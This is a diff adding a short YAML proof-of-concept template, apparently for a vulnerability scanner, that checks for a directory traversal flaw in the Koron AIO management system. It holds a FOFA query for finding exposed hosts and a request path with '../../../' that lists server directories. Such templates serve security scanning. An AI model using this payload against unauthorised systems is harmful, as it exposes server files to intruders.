@@ -1,0 +1,15 @@
+id: poc-yaml-koron-aio-getfilelist-directory-traversal
+info:
+  name: 科荣 AIO管理系统 getFileList 目录遍历漏洞
+  severity: medium
+  tags:
+  - 目录遍历
+  finger: 科荣 AIO 管理系统
+  fofa: body="changeAccount('8000')"
+requests:
+- method: GET
+  path: /ReportServlet?operation=getFileList&path=../../../
+  expression: status_code == 200 && contains(body,"<fileList>") && contains(body,"item
+    fileName=") && contains(body,"xml") && !contains(headers,"Content-Type:")
+variables: {}
+transport: http
